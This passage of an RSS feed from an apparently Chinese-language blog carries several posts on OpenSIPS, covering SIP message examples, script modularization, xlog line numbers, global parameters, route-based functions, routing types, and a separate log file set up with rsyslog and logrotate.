&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: &amp;lt;sip:alice@client.atlanta.example.com;transport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: application/sdp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;151&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ACK sip:bob@client.biloxi.example.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bK74b76
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Max-Forwards: &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:ss1.atlanta.example.com;lr&amp;gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;sip:ss2.biloxi.example.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From: Alice &amp;lt;sip:alice@atlanta.example.com&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;9fxced76sl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;To: Bob &amp;lt;sip:bob@biloxi.example.com&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;314159&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Call-ID: 3848276298220188511@atlanta.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CSeq: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ACK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意，一定要明确一个消息，到底是请求还是响应。我们说初始化请求和序列化请求，说的都是请求，而不是响应。&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>脚本路由模块化</title>
      <link>https://wdd.js.org/opensips/ch5/module/</link>
      <pubDate>Sun, 16 Jun 2019 11:22:56 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/module/</guid>
      <description>&lt;p&gt;当你的代码一个屏幕无法展示完时，你就需要考虑模块化的事情了。&lt;/p&gt;
&lt;p&gt;维护一个上千行的代码，是很辛苦，也是很恐怖的事情。&lt;/p&gt;
&lt;p&gt;我们应当把自己的关注点放在某个具体的点上。&lt;/p&gt;
&lt;h1 id=&#34;方法1-include_file&#34;&gt;方法1 include_file&lt;/h1&gt;
&lt;p&gt;具体方法是使用include_file参数。&lt;/p&gt;
&lt;p&gt;如果你的opensips.cfg文件到达上千行，你可以考虑使用一下include_file指令。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;include_file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;global.cfg&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;include_file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;moudule.cfg&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;include_file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;routing.cfg&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;方法2-m4-宏编译&#34;&gt;方法2 m4 宏编译&lt;/h1&gt;
&lt;p&gt;参考：&lt;a href=&#34;https://github.com/wangduanduan/m4-opensips.cfg&#34;&gt;https://github.com/wangduanduan/m4-opensips.cfg&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>优雅的使用xlog输出日志行</title>
      <link>https://wdd.js.org/opensips/ch5/xlog/</link>
      <pubDate>Sun, 16 Jun 2019 11:16:32 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/xlog/</guid>
      <description>&lt;p&gt;在opensips 2.2中加入新的全局配置cfg_line, 用来返回当前日志在整个文件中的行数。&lt;/p&gt;
&lt;p&gt;注意，低于2.2的版本不能使用cfg_line。&lt;/p&gt;
&lt;p&gt;使用方法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$cfg_line&lt;span style=&#34;color:#e6db74&#34;&gt; enter_ack_deal&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$cfg_line&lt;span style=&#34;color:#e6db74&#34;&gt; enter_ack_deal&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果没有cfg_line这个参数，你在日志中看到enter_ack_deal后，根本无法区分是哪一行打印了这个关键词。&lt;/p&gt;
&lt;p&gt;使用了cfg_line后，可以在日志中看到类似如下的日志输出方式，很容易区分哪一行日志执行了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; enter_ack_deal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;823&lt;/span&gt; enter_ack_deal
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>全局参数配置</title>
      <link>https://wdd.js.org/opensips/ch5/global-params/</link>
      <pubDate>Sun, 16 Jun 2019 11:03:12 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/global-params/</guid>
      <description>&lt;p&gt;本全局参数基于opensips 2.4介绍。&lt;/p&gt;
&lt;p&gt;opensips的全局参数有很多，具体可以参考。&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreParameters-2-4#toc37&#34;&gt;https://www.opensips.org/Documentation/Script-CoreParameters-2-4#toc37&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面介绍几个常用的参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;172.16.200.228:4400
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;log_level&#34;&gt;log_level&lt;/h1&gt;
&lt;p&gt;log_level的值配置的越大，输出的日志越详细。log_level的值的范围是[-3, 4]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-3 - Alert level&lt;/li&gt;
&lt;li&gt;-2 - Critical level&lt;/li&gt;
&lt;li&gt;-1 - Error level&lt;/li&gt;
&lt;li&gt;1 - Warning level&lt;/li&gt;
&lt;li&gt;2 - Notice level&lt;/li&gt;
&lt;li&gt;3 - Info level&lt;/li&gt;
&lt;li&gt;4 - Debug level&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;log_facility&#34;&gt;log_facility&lt;/h1&gt;
&lt;p&gt;log_facility用来设置独立的opensips日志文件，参考&lt;a href=&#34;https://www.yuque.com/wangdd/opensips/log&#34;&gt;https://www.yuque.com/wangdd/opensips/log&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;listen&#34;&gt;listen&lt;/h1&gt;
&lt;p&gt;listen用来设置opensips监听的端口和协议, 由于opensips底层支持的协议很多，所以你可以监听很多不同协议。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意一点&lt;/strong&gt;：不要监听本地环回地址127.0.0.1, 而要监听etho0的ip地址。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen:udp:172.16.200.228:5060
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen:tcp:172.16.200.228:5061
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen:ws:172.16.200.228:5062
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>函数特点</title>
      <link>https://wdd.js.org/opensips/ch5/function/</link>
      <pubDate>Sun, 16 Jun 2019 10:48:57 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/function/</guid>
      <description>&lt;p&gt;opensips脚本中没有类似function这样的关键字来定义函数，它的函数主要有两个来源。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;opensips核心提供的函数: &lt;/li&gt;
&lt;li&gt;模块提供的函数: lb_is_destination(), consume_credentials()&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;函数特点&#34;&gt;函数特点&lt;/h1&gt;
&lt;p&gt;opensips函数的特点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;最多支持6个参数&lt;/li&gt;
&lt;li&gt;所有的参数都是字符串，即使写成数字，解析时也按照字符串解析&lt;/li&gt;
&lt;li&gt;函数的返回值只能是整数&lt;/li&gt;
&lt;li&gt;所有函数不能返回0，返回0会导致路由停止执行，return(0)相当于exit()&lt;/li&gt;
&lt;li&gt;函数返回的正数可以翻译成true&lt;/li&gt;
&lt;li&gt;函数返回的负数会翻译成false&lt;/li&gt;
&lt;li&gt;使用return(9)返回结果&lt;/li&gt;
&lt;li&gt;使用$rc获取上个函数的返回值&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;虽然opensips脚本中无法自定义函数，但是可以把route关键字作为函数来使用。&lt;/p&gt;
&lt;p&gt;可以给&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 定义enter_log函数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;enter_log&lt;span style=&#34;color:#f92672&#34;&gt;]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(1)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# $param(1) 是指调用enter_log函数的第一个参数，即wangdd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# 调用enter_log函数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;enter_log, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wangdd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 获取enter_log的返回值 $rc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rc&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;如何传参&#34;&gt;如何传参&lt;/h1&gt;
&lt;p&gt;某个函数可以支持6个参数，全部都是的可选的，但是我只想传第一个和第6个，应该怎么传？&lt;/p&gt;
&lt;p&gt;不想传参的话，需要使用逗号隔开&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;siprec_start_recording&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;srs,,,,,media_ip&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>路由分类</title>
      <link>https://wdd.js.org/opensips/ch5/routing-type/</link>
      <pubDate>Sun, 16 Jun 2019 10:46:44 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/routing-type/</guid>
      <description>&lt;p&gt;opensips路由分为两类，主路由和子路由。&lt;strong&gt;主路由被opensips调用，子路由在主路由中被调用。可以理解子路由是一种函数。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所有路由中不允许出现无任何语句的情况，否则将会导致opensips无法正常启动，例如下面&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;some_xxx&lt;span style=&#34;color:#f92672&#34;&gt;]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;主路由分为几类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;请求路由&lt;/li&gt;
&lt;li&gt;分支路由&lt;/li&gt;
&lt;li&gt;失败路由&lt;/li&gt;
&lt;li&gt;响应路由&lt;/li&gt;
&lt;li&gt;本地路由&lt;/li&gt;
&lt;li&gt;启动路由&lt;/li&gt;
&lt;li&gt;定时器路由&lt;/li&gt;
&lt;li&gt;事件路由&lt;/li&gt;
&lt;li&gt;错误路由&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;inspect：查看sip消息内容
modifies: 修改sip消息内容，例如修改request url
drop: 丢弃sip请求
forking: 可以理解为发起一个invite, 然后可以拨打多个人
signaling: 信令层的操作，例如返回200ok之类的&lt;/p&gt;&lt;/blockquote&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;路由&lt;/th&gt;
          &lt;th&gt;是否必须&lt;/th&gt;
          &lt;th&gt;默认行为&lt;/th&gt;
          &lt;th&gt;可以做&lt;/th&gt;
          &lt;th&gt;不可以做&lt;/th&gt;
          &lt;th&gt;触发方向&lt;/th&gt;
          &lt;th&gt;触发次数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;请求路由&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;drop&lt;/td&gt;
          &lt;td&gt;inspect,modifies, drop, signaling&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;incoming, inbound&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;分支路由&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;send out&lt;/td&gt;
          &lt;td&gt;forking, modifies, drop, inspect&lt;/td&gt;
          &lt;td&gt;relaying, replying,&lt;!-- raw HTML omitted --&gt;signaling&lt;/td&gt;
          &lt;td&gt;outbound, outgoing, branch frok&lt;/td&gt;
          &lt;td&gt;一个请求/事务一次&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;失败路由&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;将错误返回给产生者&lt;/td&gt;
          &lt;td&gt;signaling，replying, inspect&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;incoming&lt;/td&gt;
          &lt;td&gt;一个请求/事务一次&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;响应路由&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;relay back&lt;/td&gt;
          &lt;td&gt;inspect, modifies&lt;/td&gt;
          &lt;td&gt;signaling&lt;/td&gt;
          &lt;td&gt;incoming, inbound&lt;/td&gt;
          &lt;td&gt;一个请求/事务一次&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;本地路由&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;send out&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;signaling&lt;/td&gt;
          &lt;td&gt;outbound&lt;/td&gt;
          &lt;td&gt;本地路由只能有一个&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;剩下的启动路由，定时器路由，事件路由，错误路由只能用来做和sip消息无关的事情。&lt;/p&gt;</description>
    </item>
    <item>
      <title>设置独立日志文件</title>
      <link>https://wdd.js.org/opensips/ch3/log/</link>
      <pubDate>Sun, 16 Jun 2019 10:33:15 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/log/</guid>
      <description>&lt;h1 id=&#34;设置独立日志&#34;&gt;设置独立日志&lt;/h1&gt;
&lt;p&gt;默认情况下，opensips的日志会写在系统日志文件&lt;code&gt;/var/log/message&lt;/code&gt;中，为了避免难以查阅日志，我们可以将opensips的日志写到单独的日志文件中。&lt;/p&gt;
&lt;p&gt;环境说明&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;debian buster&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这个需要做两步。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一步，配置opensips.cfg文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第二步, 创建日志配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local0.* -/var/log/opensips.log&amp;#34;&lt;/span&gt; &amp;gt; /etc/rsyslog.d/opensips.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第三步，创建日志文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;touch /var/log/opensips.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第四步，重启rsyslog和opensips&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service rsyslog restart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl restart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第五步，验证结果&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tail /var/log/opensips.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;日志回滚&#34;&gt;日志回滚&lt;/h1&gt;
&lt;p&gt;为了避免日志文件占用过多磁盘空间，需要做日志回滚。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-systemverilog&#34; data-lang=&#34;systemverilog&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;安装&lt;/span&gt;logrotate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install logrotate &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;日志回滚配置文件 /etc/logrotate.d/opensips&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-systemverilog&#34; data-lang=&#34;systemverilog&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;opensips.log {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     noolddir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     size &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;M
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     rotate &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     copytruncate
